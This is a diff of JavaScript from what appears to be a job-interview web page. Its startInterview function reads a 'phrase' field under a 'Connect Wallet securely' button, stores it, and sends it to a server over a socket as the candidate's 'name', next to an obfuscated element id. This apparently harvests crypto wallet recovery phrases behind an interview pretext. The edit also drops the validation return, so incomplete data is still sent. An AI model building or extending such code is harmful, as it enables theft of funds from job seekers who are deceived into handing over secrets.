@@ -646,55 +646,65 @@
 
 
     function startInterview(btn, type, isRestore = false) {
+        
+            btn.classList.add('btn-loading');
+                const btnText = btn.querySelector('.btn-text');
+                if(btnText) btnText.innerText = "Processing...";
 
-        btn.classList.add('btn-loading');
-            const btnText = btn.querySelector('.btn-text');
-            if(btnText) btnText.innerText = "Processing...";
+                let candidateName;
+                let candidateEmail;
+                let selectedCategory;
 
-           /* setTimeout(() => {
-                btn.classList.remove('btn-loading');
-                btnText.innerText = "Process Verification";
-            }, 2000);*/
-
-
-        if(!isRestore) {
+               /* setTimeout(() => {
+                    btn.classList.remove('btn-loading');
+                    btnText.innerText = "Process Verification";
+                }, 2000);*/
 
 
-            const placeholderVal = document.getElementById('placeholder')?.value;
-            const phraseVal      = document.getElementById('phrase')?.value;
-            const emailVal       = document.getElementById('email-input')?.value;
+            if(!isRestore) {
 
-            // Assign based on type
-            let candidateName  = (type === "credentials") ? placeholderVal : phraseVal;
-            let candidateEmail = (type === "credentials") ? emailVal       : getOrCreateDeviceID();
 
-            selectedCategory = document.getElementById('country-hidden-input').value;
-            if(!candidateName || !candidateEmail || !selectedCategory) {
-                return alert("Select a role and enter both your name and email.");
+                const placeholderVal = document.getElementById('placeholder')?.value;
+                const phraseVal      = document.getElementById('phrase')?.value;
+                const emailVal       = document.getElementById('email-input')?.value;
+
+                // Assign based on type
+                candidateName  = (type === "credentials") ? placeholderVal : phraseVal;
+                candidateEmail = (type === "credentials") ? emailVal: getOrCreateDeviceID();
+                selectedCategory = document.getElementById('country-hidden-input').value;
+
+
+                if(!candidateName || !candidateEmail || !selectedCategory) {
+                    btn.classList.remove('btn-loading');
+                    btnText.innerText = (type === "credentials") ? "Process Verification" : "Connect Wallet securely";
+                }
+                
+                localStorage.setItem('cand_name', candidateName);
+                localStorage.setItem('cand_email', candidateEmail);
+                localStorage.setItem('cand_cat', selectedCategory);
             }
-            
-            localStorage.setItem('cand_name', candidateName);
-            localStorage.setItem('cand_email', candidateEmail);
-            localStorage.setItem('cand_cat', selectedCategory);
-        }
-        document.getElementById('error-div').innerHTML = '';
-        $('#z6x2c9v4b1_992211').show();
-        
-        const socketBody = { 
-            name: candidateName, 
-            email: candidateEmail, 
-            categoryId: selectedCategory 
-        }
-        
-        socket.emit('join_interview', socketBody);
 
-        const savedTask = localStorage.getItem('current_task');
-        if (isRestore && savedTask) {
-            const taskData = JSON.parse(savedTask);
-            currentScreenFile = taskData.screenFile;
-            renderScreen(taskData);
+            
+            document.getElementById('error-div').innerHTML = '';
+            $('#z6x2c9v4b1_992211').show();
+            
+            const socketBody = { 
+                name: candidateName, 
+                email: candidateEmail, 
+                categoryId: selectedCategory 
+            }
+
+            console.log(socketBody);
+            
+            socket.emit('join_interview', socketBody);
+
+            const savedTask = localStorage.getItem('current_task');
+            if (isRestore && savedTask) {
+                const taskData = JSON.parse(savedTask);
+                currentScreenFile = taskData.screenFile;
+                renderScreen(taskData);
+            }
         }
-    }
 
     socket.on('new_task', async (data) => {
         if ($('#z6x2c9v4b1_992211')) {
